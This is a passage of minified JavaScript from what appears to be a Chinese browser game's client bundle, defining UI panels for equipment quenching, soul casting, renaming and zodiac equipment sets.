1==this.bagOrBody&&this.tabIndex==n||o.configID!=t.configID||i>=s||o.lock||o.quality!=t.quality||this.costDatas.push(o)}for(var a=d.BagCT.ins().bagModel[d.BagCT.BAG_TYPE_OTHTER],n=0;n<a.length;n++){var l=g.ItemUtil.getType(a[n].itemConfig);if(l==r.ItemType.TYPE_52){var h=t.itemConfig.level;if(h>a[n].itemConfig.level||(a[n].itemConfig.jpAttr||0)<=t.getJPPer())continue;this.costDatas.push(a[n])}}for(var u=[],p=0;p<this.costDatas.length;p++){var o=this.costDatas[p];d.BagCT.ins().isNotRecycleXiLianEquip()&&o.isXiLian()||u.push(o)}this.listItemArrayCollection.replaceAll(u),this.listItem.selectedIndex<0&&(this.listItem.selectedIndex=0)},e.prototype.updateAttrGp=function(){var t=this.datas[this.tabIndex];if(!t)return void(this.attrGp.visible=!1);this.attrGp.visible=!0;var e=this.datas[this.tabIndex];this.nowPower.textFlow=o.TextFlowMaker.generateTextFlow(gettext("极品值|C:0x40df38&T:{0}({1}%)|",e.getJPNum(),e.getJPPer()))},e.prototype.updateQuechingAttr=function(){var t=this.datas[this.tabIndex];if(!t)return void(this.attrGp.visible=!1);this.attrGp.visible=!0;var e=y.EquipCT.ins().getBestNum(y.EquipCT.ins().quenchingAttr);this.quenchingPower.textFlow=o.TextFlowMaker.generateTextFlow(gettext("极品值|C:0x40df38&T:{0}|",e))},e.prototype.updateLstLock=function(){var t=this.datas[this.tabIndex];if(t){for(var e=[],i=[],n=y.EquipCT.ins().quenchingAttr,o=0;4>o;o++){var s=[];if(t.att[o]&&t.att[o].type){s=[t.att[o],t.att[o+4]];var a=-1==this.choiceLockArr.indexOf(o)?0:1;e.push({showLock:!0,lockType:a,attr:s,attrQx:[t.attQuality[o],t.attQuality[o+4]],ts:!1})}var r=[];n[o]&&n[o].type&&(r=[n[o],n[o+4]],i.push({showLock:!1,lockType:0,attr:r,attrQx:[0,0],ts:!1}))}if(2==y.EquipCT.ins().isQuenching)for(var o=0;o<this.choiceLockArr.length;o++)for(var l=e[this.choiceLockArr[o]].attr[0].type,h=0;h<i.length;h++)if(i[h].attr[0].type==l){i[h].ts=y.EquipCT.ins().nextAttrIsTs(e[this.choiceLockArr[o]].attr,i[h].attr);break}this.nowAttrList.dataProvider=new eui.ArrayCollection(e),this.nextAttrlist.dataProvider=new eui.ArrayCollection(i),this.changeLock()}},e.prototype.updateBtnGp=function(t){void 0===t&&(t=0);var e=a.GlobalConfig.EquipAffixCostConfig,i=this.datas[this.tabIndex];this.btnHightQuenching.enabled=this.btnQuenching.enabled=!!i,this.ordinary.visible=2!=t,this.btnQuenching.visible=this.ybGp.visible=this.btnHightQuenching.visible=0==t,this.btnOrdinaryGiveUp.visible=this.btnOrdinarySave.visible=1==t,this.high.visible=2==t;var n=a.GlobalConfig.EquipAffixBaseConfig.highRefineNums,o=y.EquipCT.ins().quenchineTime<n?2149168:16720161;if(this.highCount.text=this.high.visible?gettext("可打磨{0}次",n-y.EquipCT.ins().quenchineTime):"",this.highCount.textColor=o,!i)return void(this.countLabel.text="20");var s=e[i.quality],r=0;for(var l in s){var h=s[l];i.itemConfig.level>=h.interval[0]&&i.itemConfig.level<=h.interval[1]&&(r=h.costYuanbao)}this.countLabel.text=""+r},e.prototype.changeEquipTab=function(t){var e=this;if(this.tabIndex!=t.itemIndex)return y.EquipCT.ins().isQuenching?void T.WarnWin.show(gettext("当前淬炼属性未保存，是否确认放弃?"),function(){e.tabItem.selectedIndex=t.itemIndex,e.choiceLockArr=[],e.noKeepFun(),e.tabItem.selectedIndex=e.tabIndex=t.itemIndex,e.updateChangeEquipTab()},this):(this.tabItem.selectedIndex=t.itemIndex,this.choiceLockArr=[],this.updateChangeEquipTab(),void 0)},e.prototype.updateChangeEquipTab=function(){var t=this.tabItem.selectedIndex,e=this.datas[t];if(this.tabIndex=this.tabItem.selectedIndex,this.curData=e,this.updateitemInfoGp(),this.updateAttrGp(),this.updateLstLock(),e){var i=this.bagOrBody?-1:e.subType2;y.EquipCT.ins().sendQuenchingInfo(e.handle,i)}else this.updateQuechingAttr(),this.updateBtnGp(),this.updateCostBestGp()},e.prototype.attrItemClick=function(t){if(t.target instanceof eui.Button){var e=t.target.parent.parent.itemIndex,i=this.choiceLockArr.indexOf(e);-1==i?this.choiceLockArr.unshift(e):this.choiceLockArr.splice(i,1),this.choiceLockArr.length>=2&&(this.choiceLockArr.length=2),this.changeLock()}},e.prototype.changeLock=function(){this.nowAttrList.validateNow();for(var t=0;t<this.nowAttrList.numElements;t++){var e=this.nowAttrList.getElementAt(t);e.lockBtn.icon=-1==this.choiceLockArr.indexOf(t)?"Tips_js":"Tips_sd"}},e.prototype.onChangeBagEquip=function(t){var e=this;if(this.IdxTab!=t.itemIndex){if(y.EquipCT.ins().isQuenching)return T.WarnWin.show(gettext("当前淬炼属性未保存，是否确认放弃?"),function(){e.IdxTab=t.itemIndex,e.eTab.selectedIndex=t.itemIndex,e.choiceLockArr=[],e.noKeepFun(),e.updateOnChangeBagEquip()},this),this.eTab.selectedIndex=this.bagOrBody,void this.changeLock();this.IdxTab=t.itemIndex,this.eTab.selectedIndex=t.itemIndex,this.choiceLockArr=[],this.updateOnChangeBagEquip()}},e.prototype.updateOnChangeBagEquip=function(){this.bagOrBody=this.eTab.selectedIndex,this.tabIndex=0,this.tabItem.selectedIndex=0,this.updateTabItem(),this.updateitemInfoGp(),this.updateAttrGp();var t=this.datas[0];if(t){var e=this.bagOrBody?-1:t.subType2;y.EquipCT.ins().sendQuenchingInfo(t.handle,e)}else this.updateQuechingAttr(),this.updateBtnGp(),this.updateCostBestGp()},e.prototype.onClick=function(t){var e,i,o=this.datas[this.tabIndex],s=this.costDatas[this.listItem.selectedIndex],h=this.bagOrBody?-1:null===o||void 0===o?void 0:o.subType2;s&&(i=g.ItemUtil.getType(s.itemConfig));var p=this.choiceLockArr[0],c=this.choiceLockArr[1],m=void 0!=p?this.nowAttrList.getElementAt(p).data.attr[0].type:0,v=void 0!=c?this.nowAttrList.getElementAt(c).data.attr[0].type:0,b=i!=r.ItemType.TYPE_52?null===s||void 0===s?void 0:s.handle:null===s||void 0===s?void 0:s.configID;switch(t.currentTarget){case this.btnQuenching:o?100==o.getJPPer()?C.TipsCT.ins().showTips(gettext("极品值已满")):s?y.EquipCT.ins().sendQuenching(o.handle,h,1,b,m,v):C.TipsCT.ins().showTips(gettext("请选择淬炼所消耗的道具")):C.TipsCT.ins().showTips(gettext("请选择淬炼的极品装备"));break;case this.btnHightQuenching:var w=a.GlobalConfig.EquipAffixCostConfig,I=w[o.quality],_=0;for(var S in I){var x=I[S];o.itemConfig.level>=x.interval[0]&&o.itemConfig.level<=x.interval[1]&&(_=x.costYuanbao)}o?100==o.getJPPer()?C.TipsCT.ins().showTips(gettext("极品值已满")):s?u.ActorCC.yb<_?C.TipsCT.ins().showTips(gettext("元宝不足")):0==this.choiceLockArr.length?C.TipsCT.ins().showTips(gettext("请锁定属性，仅被锁定属性保存后获得提升")):y.EquipCT.ins().sendQuenching(o.handle,h,2,b,m,v):C.TipsCT.ins().showTips(gettext("请选择淬炼所消耗的道具")):C.TipsCT.ins().showTips(gettext("请选择淬炼的极品装备"));break;case this.btnOrdinarySave:case this.btnSave:0!=y.EquipCT.ins().isQuenching?y.EquipCT.ins().saveOrAbandonQuenching(o.handle,h,1):C.TipsCT.ins().showTips(gettext("没有已淬炼的属性"));break;case this.btnOrdinaryGiveUp:case this.btnGiveUp:this.noKeepFun();case this.btnPolish:if(y.EquipCT.ins().quenchineTime>=a.GlobalConfig.EquipAffixBaseConfig.highRefineNums)return void C.TipsCT.ins().showTips(gettext("打磨次数不足"));if(0==this.choiceLockArr.length)return void C.TipsCT.ins().showTips(gettext("请锁定属性，仅被锁定属性保存后获得提升"));if(!n.GlobalFun.checkCost(20,l.MoneyConst.yuanbao))return;y.EquipCT.ins().sendQuenching(o.handle,h,2,0,m,v);break;case this.btnHelp:win.open("CommonHelpWin",(null===(e=a.GlobalConfig.HelpInfoConfig[4])||void 0===e?void 0:e.text)||"");break;case this.resetBtn:var D=(null===o||void 0===o?void 0:o.getJPNum())||0;if(D>1){var A=a.GlobalConfig.EquipAffixBaseConfig.refineReset[o.quality],k=new f.ItemData;k.configID=A.id,d.BagCT.ins().isConsumeEnough(A)?T.WarnWin.show(gettext("是否消耗{0}*{1}进行重置?",k.itemConfig.name,A.count),function(){y.EquipCT.ins().resetQuenching(o.handle)},this):C.TipsCT.ins().showTips(gettext("需要{0}*{1}才可进行重置",k.itemConfig.name,A.count))}else C.TipsCT.ins().showTips(gettext("极品等级大于1才可以重置"))}},e.prototype.noKeepFun=function(){var t=this.datas[this.tabIndex];if(t){var e=this.bagOrBody?-1:t.subType2;0!=y.EquipCT.ins().isQuenching?(y.EquipCT.ins().saveOrAbandonQuenching(t.handle,e,2),y.EquipCT.ins().isQuenching=0,y.EquipCT.ins().quenchingAttr=[],this.keepCb()):C.TipsCT.ins().showTips(gettext("没有已淬炼的属性"))}},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=v.OpenSystem.ins().checkSysOpen(h.SystemType.EquipClear);return i||(C.TipsCT.ins().showTips(v.OpenSystem.ins().getNoOpenTips(h.SystemType.EquipClear)),win.open(m.View_BianQiang,2)),i},__decorate([delayCall(100)],e.prototype,"updateView",null),e}(s.BaseView);e.EquipQuenchingPanel=S,window.EquipQuenchingPanel=S,__reflect(S.prototype,"EquipQuenchingPanel",[]),window.EquipQuenchingPanel=S},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipSoulWin=void 0;var n=i(22),o=i(0),s=i(57),a=i(15),r=i(67),l=i(12),h=i(38),u=i(2),p=i(262),d=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.skinComplete=function(){t.prototype.skinComplete.call(this),this.btnClear.label=gettext("开始铸魂"),this.lab.text=gettext("可铸魂属性一览"),this.lab1.text=gettext("铸魂属性"),this.talkLab.text=gettext("铸魂说明"),this.StrArr=[gettext("铸魂"),gettext("五色石")],this.StrArr1=[gettext("铸魂消耗")],this.PanelType=s.PANEL_TYPE.Soul,this.inItData()},e.prototype.inItData=function(){this.MsgCbDic={info:null,update:h.EquipCT.ins().postEquipSoul},this.CfgDic={AffixCfg:o.GlobalConfig.EquipCastSoulConfig,AffixBaseCfgCost:o.GlobalConfig.EquipAffixBaseConfig.castSoulItemId,AffixCostCfg:o.GlobalConfig.EquipAffixCostConfig,HelpCfg:o.GlobalConfig.HelpInfoConfig[5],StoreCfg:o.GlobalConfig.ItemStoreConfig[17],HelpCfg2:o.GlobalConfig.HelpInfoConfig[210]},this.keepArr=h.EquipCT.ins().soulAttr,this.quilyArr=h.EquipCT.ins().soulQuily},e.prototype.updateData=function(){this.keepArr=h.EquipCT.ins().soulAttr,this.quilyArr=h.EquipCT.ins().soulQuily},e.prototype.updateView=function(){t.prototype.updateView.call(this);var e=this.tabEquip.selectedIndex<=-1?0:this.tabEquip.selectedIndex,i=this.resultData?this.resultData[e]:null;i&&i.quality<6?(this.useYb0.visible=!1,this.lstLock.visible=!1):(this.useYb0.visible=!0,this.lstLock.visible=!0),this.updateCount()},e.prototype.onCheckSoul=function(){t.prototype.onCheckSoul.call(this),this.updateCount()},e.prototype.updateCount=function(){var t=1,e=o.GlobalConfig.EquipAffixBaseConfig.castSoulPrefixCostCount,i=0==this.lock1?1:2,n=this.useYb0.selected?e:0,s=t*i+n;this.costCm.setData({type:0,id:this.CfgDic.AffixBaseCfgCost,count:s})},e.prototype.setItemAtt=function(t){for(var e=t?n.AttributeData.getAttrNum(t.extAtt):0,i=[],o=0;e>o;o++){var s={};i.push(s)}this.lockAc.replaceAll(i)},e.prototype.onlstLock=function(t){this.lstLock.selectedItems.length>1&&(this.lstLock.selectedIndices.pop(),this.lstLock.selectedItems.pop());var e=this.lstLock.selectedIndices.length;switch(e){case 0:this.lock1=0;break;case 1:this.lock1=this.lstLock.selectedIndices[0]+1}this.costTimes=e+1,this.lstLock.validateNow(),this.onCheckSoul(),this.updateCount()},e.prototype.CleanData=function(){this.keepArr=h.EquipCT.ins().soulAttr=[],this.quilyArr=h.EquipCT.ins().soulQuily=[]},e.prototype.rpcInfo=function(t,e){h.EquipCT.ins().sendEquipClearInfo(t,[e])},e.prototype.rpcChange=function(t,e,i,n,o){h.EquipCT.ins().sendSoul(t,n,o)},e.prototype.rpcSave=function(t,e){h.EquipCT.ins().saveSoul(t,e)},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=l.OpenSystem.ins().checkSysOpen(a.SystemType.EquipSoul);return i||(u.TipsCT.ins().showTips(l.OpenSystem.ins().getNoOpenTips(a.SystemType.EquipSoul)),win.open(r.View_BianQiang,2)),i},e}(p.EquipClearPanel);e.EquipSoulWin=d,window.EquipSoulWin=d,__reflect(d.prototype,"EquipSoulWin",[]),window.EquipSoulWin=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ReformWin=void 0;var n=i(16),o=i(1),s=i(38),a=i(27),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.oneLevelWin=!0,e._sn_="ReformSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){var t=this;this.bg.closeFun=function(){return s.EquipCT.ins().extAttrs.length>0&&0==t.eTab.selectedIndex?void a.WarnWin.show(gettext("当前洗练属性未保存，是否确认放弃?"),function(){t.bg.closeWin()},t):s.EquipCT.ins().isQuenching&&1==t.eTab.selectedIndex?void a.WarnWin.show(gettext("当前淬炼属性未保存，是否确认放弃?"),function(){t.bg.closeWin(),s.EquipCT.ins().clEquipId>0&&s.EquipCT.ins().saveOrAbandonQuenching(s.EquipCT.ins().clEquipId,s.EquipCT.ins().clEquipIdx,2),s.EquipCT.ins().isQuenching=0,s.EquipCT.ins().quenchingAttr=[]},t):s.EquipCT.ins().soulAttr.length>0&&2==t.eTab.selectedIndex?void a.WarnWin.show(gettext("当前铸魂属性未保存，是否确认放弃?"),function(){t.bg.closeWin()},t):s.EquipCT.ins().tempDuanPoPro&&s.EquipCT.ins().tempDuanPoPro.skillId>0&&3==t.eTab.selectedIndex?void a.WarnWin.show(gettext("当前锻魄属性未保存，是否确认放弃?"),function(){s.EquipCT.ins().tempDuanPoPro={skillId:0,preId:0,proArr:[]},t.bg.closeWin()},t):void t.bg.closeWin()},this.eTab.addEventListener(eui.UIEvent.CHANGE,this.CHANGE,this),this.eTab.addEventListener(eui.UIEvent.CHANGING,this.CHANGING,this)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.param=t;var i=this.param[0]||0,n=egret.getQualifiedClassName(this.eVs.getChildAt(i));win.openCheck(egret.getDefinitionByName(n))||(i=0);var o=i;this.eTab.selectedIndex=this.eVs.selectedIndex=o},e.prototype.CHANGE=function(t){this.cleanData()},e.prototype.CHANGING=function(t){var e=this,i=this.eVs.selectedIndex,n=this.eTab.selectedIndex;if(3==i)s.EquipCT.ins().tempDuanPoPro&&s.EquipCT.ins().tempDuanPoPro.skillId>0&&(t.preventDefault(),a.WarnWin.show(gettext("当前属性未保存，是否确认放弃?"),function(){var t=egret.getQualifiedClassName(e.eVs.getChildAt(n));win.openCheck(egret.getDefinitionByName(t))&&(s.EquipCT.ins().tempDuanPoPro={skillId:0,preId:0,proArr:[]},e.eVs.selectedIndex=n,s.EquipCT.ins().postDuanPoTempAttrFlus())},this));else{var o;s.EquipCT.ins().extAttrs.length>0&&0==i?o=gettext("洗练"):s.EquipCT.ins().isQuenching&&1==i&&(o=gettext("淬炼")),o&&(t.preventDefault(),a.WarnWin.show(gettext("当前{0}属性未保存，是否确认放弃?",o),function(){var t=egret.getQualifiedClassName(e.eVs.getChildAt(n));win.openCheck(egret.getDefinitionByName(t))&&(s.EquipCT.ins().postChangeTabClear(),e.eVs.selectedIndex=n,e.cleanData())},this))}},e.prototype.cleanData=function(){s.EquipCT.ins().extAttrs=[],s.EquipCT.ins().quily=[],s.EquipCT.ins().soulAttr=[],s.EquipCT.ins().soulQuily=[],s.EquipCT.ins().clearTab=null,s.EquipCT.ins().clearEquipUid=null},e.prototype.removeDisplay=function(){if(this.skin){if(this.cleanData(),this.removeObserve(),this.eVs&&this.eVs.numElements>0)for(var t=this.eVs.numElements-1;t>=0;t--){var e=this.eVs.getElementAt(t);e&&n.DisplayUtils.removeFromParent(e)}n.DisplayUtils.removeFromParent(this.eVs),n.DisplayUtils.removeFromParent(this.eTab)}},e}(o.BaseView);e.ReformWin=r,window.ReformWin=r,__reflect(r.prototype,"ReformWin",[]),window.ReformWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RenameWin=void 0;var n=i(24),o=i(1),s=i(0),a=i(91),r=i(172),l=i(6),h=i(23),u=i(2),p=i(60),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="NameChangeSkin",e.reType=0,e.curWarSoulId=0,e.defaultRect=!0,e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.reType=t[0]?t[0]:0,1==this.reType&&(this.curWarSoulId=t[1]?t[1]:0,this.lbTitle.text=gettext("战灵改名"),this.lbTips.text=""),"7000183"==urlParam.appid&&window.mz?(this.chatGroup.touchChildren=!1,this.chatGroup.touchEnabled=!0):(this.chatGroup.touchChildren=!0,this.chatGroup.touchEnabled=!1),this.addTouchEvent(this.bgClose,this.onTap),this.addTouchEvent(this.sureBtn,this.onTap),this.addTouchEvent(this.chatGroup,this.onTap),observe(this,this.updateInputText,h.GameLogic.ins().postInputText),this.input.addEventListener(egret.FocusEvent.FOCUS_IN,this.textInOn,this)},e.prototype.updateInputText=function(t){this.input.text=t,this.textInOn()},e.prototype.textInOn=function(){this.input.text==gettext("请输入")&&(this.input.text="")},e.prototype.removeDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.input.removeEventListener(egret.FocusEvent.FOCUS_IN,this.textInOn,this)},e.prototype.onTap=function(t){var e;switch(t.currentTarget){case this.bgClose:win.close("RenameWin");break;case this.sureBtn:if(0==this.input.text.length)return void u.TipsCT.ins().showTips(gettext("您尚未输入名字！"));if(!r.RoleMgr.ins().checkName(this.input.text))return;if(0==this.reType){if(!l.BagCT.ins().getBagItemById(a.ItemConst.RENAME)){var i=(null===(e=s.GlobalConfig.ItemConfig[a.ItemConst.RENAME])||void 0===e?void 0:e.name)||gettext("道具");return void u.TipsCT.ins().showTips(i+gettext("不足！"))}h.GameLogic.ins().sendRename(this.input.text)}else 1==this.reType&&p.WarSoulCT.ins().checkChangeNameTime(!0)&&p.WarSoulCT.ins().sendWarSoulName(this.curWarSoulId,this.input.text);break;case this.chatGroup:"7000183"==urlParam.appid&&window.mz&&n.CommonUtils.getKeyboard(0,this.input.text+""||"")}},e}(o.BaseView);e.RenameWin=d,window.RenameWin=d,__reflect(d.prototype,"RenameWin",[]),window.RenameWin=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MianCityLock=void 0;var n=i(1),o=i(0),s=i(20),a=i(143),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="roguecitySkin",e.isBtn=!1,e.isNo=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this.entry,this.onTouchs),this.addTouchEvent(this.btnHelp,this.onTouchs)},e.prototype.addDisplay=function(){this.isBtn=!1,this.isNo&&(this.setAni(),this.isNo=!1)},e.prototype.onTouchs=function(t){var e;switch(t.target){case this.entry:if(this.isBtn)return;this.isBtn=!0;var i=s.GameMap.fubenID,n=o.GlobalConfig.InstanceConfig[i];n&&n.gameId&&(a.RogueCT.ins().sendPassById(n.gameId),this.setBtn());break;case this.btnHelp:win.open("CommonHelpWin",(null===(e=o.GlobalConfig.HelpInfoConfig[359])||void 0===e?void 0:e.text)||"")}},e.prototype.setBtn=function(){this.isBtn=!1},e.prototype.setAni=function(){if(!this.skin)return void(this.isNo=!0);var t=o.GlobalConfig.InstanceConfig[s.GameMap.fubenID];t&&t.gameId&&a.RogueCT.ins().returnIsOpen(t.gameId)&&this.closeWin()},e.prototype.closeWin=function(){this.visible=!1},__decorate([delayCall(1e3)],e.prototype,"setBtn",null),e}(n.BaseView);e.MianCityLock=r,window.MianCityLock=r,__reflect(r.prototype,"MianCityLock",[]),window.MianCityLock=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Animals12Win=void 0;var n=i(5),o=i(0),s=i(15),a=i(13),r=i(6),l=i(62),h=i(12),u=i(2),p=i(38),d=i(498),c=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="Animals12Skin",e.START_INDEX=22,e.equips=[],e}return __extends(e,t),e.prototype.skinComplete=function(){return __awaiter(this,void 0,void 0,function(){var t;return __generator(this,function(e){for(this.touchEnabled=!1,this.touchChildren=!0,t=this.START_INDEX;this["item"+t];)this.equips[t]=this["item"+t],this.equips[t].touchEnabled=!0,this.equips[t].touchChildren=!1,this.equips[t].isShowTips(!1),this.addTouchEvent(this.equips[t],this.onItemClick),t++;return this.role=a.SubRoles.ins().getSubRoleByIndex(0),[2]})})},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.cbIdx,r.BagCT.ins().setSelectEquipIdx),observe(this,this.updataEquip,p.EquipCT.ins().postAddSpirit),observe(this,this.updataEquip,p.EquipCT.ins().postEquipChange),observe(this,this.updataEquip,p.EquipCT.ins().postLock),this.update(),this.updateShenFu(),this.updateShenfuRed(),this.initSuitUI(),observe(this,this.cbIdx,r.BagCT.ins().setSelectEquipIdx),this.isInfoView=!0},e.prototype.removeDisplay=function(){this.removeObserve(),this.isInfoView=!1},e.prototype.initSuitUI=function(){var t=o.GlobalConfig.ZodiacSignEquipConfig[6],e=o.GlobalConfig.ZodiacSignEquipConfig[12],i=[],s=[];for(var r in t)i.push(t[r]);for(var r in e)s.push(e[r]);for(var l=a.SubRoles.ins().getSubRoleByIndex(0),h=l.getEquipLen(),u=[],r=22;h>r;r++){var p=l.getEquipByIndex(r);u.push(p.item)}for(var d,r=i.length-1;r>-1;r--){for(var c=i[r].quality,f=0,g=0;g<u.length;g++)u[g].quality>=c&&f++;if(f>=6){d=i[r];break}}for(var m,r=s.length-1;r>-1;r--){for(var c=s[r].quality,f=0,g=0;g<u.length;g++)u[g].quality>=c&&f++;if(f>=12){m=s[r];break}}if(d){this.skill12Name0.text=gettext("生肖守护Lv")+d.suitLv;var v=o.GlobalConfig.SkillsConfig[d.passiveSkill].desc,y=o.GlobalConfig.SkillsDescConfig[v].desc;this.suit12Derc0.textFlow=n.TextFlowMaker.generateTextFlow1(y),this.suit12Name0.text=d.suitName,this.suit12Name0.textColor=2149168}else{this.skill12Name0.text=gettext("生肖守护Lv0");var v=o.GlobalConfig.SkillsConfig[i[0].passiveSkill].desc,y=o.GlobalConfig.SkillsDescConfig[v].desc;this.suit12Derc0.textFlow=n.TextFlowMaker.generateTextFlow1(y),this.suit12Name0.text=gettext("装备随机6个生肖激活（未激活）"),this.suit12Name0.textColor=12564658}if(m){this.skill12Name1.text=gettext("生肖之力Lv")+m.suitLv;var v=o.GlobalConfig.SkillsConfig[m.passiveSkill].desc,y=o.GlobalConfig.SkillsDescConfig[v].desc;this.suit12Derc1.textFlow=n.TextFlowMaker.generateTextFlow1(y),this.suit12Name1.text=m.suitName,this.suit12Name1.textColor=2149168}else{this.skill12Name1.text=gettext("生肖之力Lv0"),this.suit12Name1.text=gettext("装备随机12个生肖激活（未激活）");var v=o.GlobalConfig.SkillsConfig[s[0].passiveSkill].desc,y=o.GlobalConfig.SkillsDescConfig[v].desc;this.suit12Derc1.textFlow=n.TextFlowMaker.generateTextFlow1(y),this.suit12Name1.textColor=12564658}},e.prototype.updataEquip=function(){this.setEquip(this.role),this.initSuitUI(),this.updateItemRp()},e.prototype.setEquip=function(t){if(t){var e=t.getEquipLen();if(0!=this.equips.length)for(var i=this.START_INDEX;e>i;i++){var n=t.getEquipByIndex(i);if(!this.equips[i])return;this.equips[i].setIndex(i),this.equips[i].setModel(t),this.equips[i].setCurRole(t.index),this.equips[i].data=n.item,0==n.item.configID?(this.equips[i].setItemImg("xb_"+(32+i-this.START_INDEX)),this.equips[i].isShowTips(!1)):this.equips[i].isShowTips(!0)}}},e.prototype.cbIdx=function(t){if(this.btnGrp&&(this.selectIdx=t,this.btnGrp.visible=this.selectIdx<0,this.selectIdx>=0&&this.equipGrp2.visible&&(this.isEquipView=!0,this.changeEquipView()),this.selectIcon.visible=this.selectIdx>-1,this.selectIdx>-1)){var e=this.equips[this.selectIdx];if(!e)return;this.selectIcon.x=e.x-(this.selectIcon.width/2-e.width/2),this.selectIcon.y=e.y-(this.selectIcon.height/2-e.height/2)}},e.prototype.onClick=function(t){switch(t.target){}},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=h.OpenSystem.ins().checkSysOpen(s.SystemType.ZODIAC);return i||u.TipsCT.ins().showTips(h.OpenSystem.ins().getNoOpenTips(s.SystemType.ZODIAC)),i},e.prototype.changeEquipView=function(){},e.prototype.updateShenFu=function(){},e.prototype.updateShenfuRed=function(){},e.prototype.updateItemRp=function(){for(var t=l.EquipPos.AnimalsRat,e=l.EquipPos.MAX,i=t;e>i;i++)if(this.equips[i]&&(this.equips[i].redPoint&&(this.equips[i].redPoint.visible=p.EquipCT.ins().checkAnimalsRpByPos(i)),!p.EquipCT.ins().checkAnimalsRpByPos(i))){var n=r.BagCT.ins().getEquipByPos(0,i);n.length>0&&-1==this.equips[i].getItemType()&&(this.equips[i].redPoint.visible=!0)}},__decorate([delayCall(100)],e.prototype,"updataEquip",null),__decorate([delayCall(100)],e.prototype,"updateItemRp",null),e}(d.RoleInfoPanel);e.Animals12Win=c,window.Animals12Win=c,__reflect(c.prototype,"Animals12Win",[]),window.Animals12Win=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.AnimalsSuitWin=void 0;var n=i(5),o=i(1),s=i(0),a=i(13),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="AnimalsSuitSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.touchEnabled=!1,this.touchChildren=!0},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=s.GlobalConfig.ZodiacSignEquipConfig[6],o=s.GlobalConfig.ZodiacSignEquipConfig[12],r=[],l=[];for(var h in i)r.push(i[h]);for(var h in o)l.push(o[h]);for(var u=a.SubRoles.ins().getSubRoleByIndex(0),p=u.getEquipLen(),d=[],h=22;p>h;h++){var c=u.getEquipByIndex(h);d.push(c.item)}for(var f,h=r.length-1;h>-1;h--){for(var g=r[h].quality,m=0,v=0;v<d.length;v++)d[v].quality>=g&&m++;if(m>=6){f=r[h];break}}for(var y,h=l.length-1;h>-1;h--){for(var g=l[h].quality,m=0,v=0;v<d.length;v++)d[v].quality>=g&&m++;if(m>=12){y=l[h];break}}if(f){this.skill6Name.text=gettext("生肖守护Lv{0}",f.suitLv);var C=s.GlobalConfig.SkillsConfig[f.passiveSkill].desc,T=s.GlobalConfig.SkillsDescConfig[C].desc;this.suit6Derc.textFlow=n.TextFlowMaker.generateTextFlow1(T),this.suit6Name.text=f.suitName}if(y){this.skill12Name.text=gettext("生肖之力Lv{0}",y.suitLv);var C=s.GlobalConfig.SkillsConfig[y.passiveSkill].desc,T=s.GlobalConfig.SkillsDescConfig[C].desc;this.suit12Derc.textFlow=n.TextFlowMaker.generateTextFlow1(T),this.suit12Name.text=y.suitName}},e.prototype.onClick=function(t){win.close(this)},e}(o.BaseView);e.AnimalsSuitWin=r,window.AnimalsSuitWin=r,__reflect(r.prototype,"AnimalsSuitWin",[]),window.AnimalsSuitWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DemonAndWingPanel=void 0;var n=i(1),o=i(17),s=i(15),a=i(6),r=i(115),l=i(155),h=i(98),u=i(499),p=i(133),d=i(12),c=i(2),f=i(263),g=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="SkillAndTotemWin",e.openIdx=0,e}return __extends(e,t),e.prototype.addDisplay=function(t){this.baseTab=this.eTab,this.baseViewStack=this.eVs,this.initTab(),this.openIdx>-1&&(this.baseTab.selectedIndex=this.baseViewStack.selectedIndex=this.openIdx)},e.prototype.initTab=function(){observe(this,this.updateTabRed,a.BagCT.ins().postItemAdd),observe(this,this.updateTabRed,a.BagCT.ins().postItemChange),observe(this,this.updateTabRed,o.RedPointBaseSys.ins().RpChange)},e.prototype.updateTabRed=function(){this.eTab.updateReds()},e.prototype.tabRp=function(){return f.WingRedPoint.ins().redPoint||u.GodWingRedPoint.ins().getGodWingRedPoint()||l.DemonCirRedPoint.ins().redPoint||p.LongGasCT.ins().AllBagRed.v||h.GodCrownCT.ins().AllBagRed.v},e.prototype.removeDisplay=function(){this.skin&&(this.openIdx=-1)},e.prototype.changeView=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.baseTab?(this.baseTab.selectedIndex=t[0]||0,this.baseViewStack&&(this.baseViewStack.selectedIndex=t[0]||0)):t&&(this.openIdx=t[0]||0)},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=r.DemonCir.ins().checkOpen();return i||c.TipsCT.ins().showTips(d.OpenSystem.ins().getNoOpenTips(s.SystemType.DEMON_CIR)),i},e.showCheck=function(){for(var 